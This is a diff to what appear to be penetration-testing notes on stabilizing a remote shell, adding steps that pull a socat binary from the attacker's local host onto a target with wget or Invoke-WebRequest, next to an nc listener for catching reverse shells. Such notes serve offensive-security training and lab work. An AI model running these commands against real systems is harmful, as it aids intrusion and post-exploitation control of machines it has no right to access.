@@ -79,4 +79,8 @@ SHELL STABILIZATION
 		- just add rlwrap before typical nc listener ```rlwrap nc -lvnp <port>``` 
 		- repeat background/foreground trick above using stty
 	- Socat:
-		- 
+		- Send a static compiled binary to target machine by hosting locally with simple server and invoking a request from target
+			- Linux:  wget <LOCAL-IP>/socat -O /tmp/socat
+			- Windows: Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
+	- General:
+		- change terminal size with stty <rows or cols> <num>
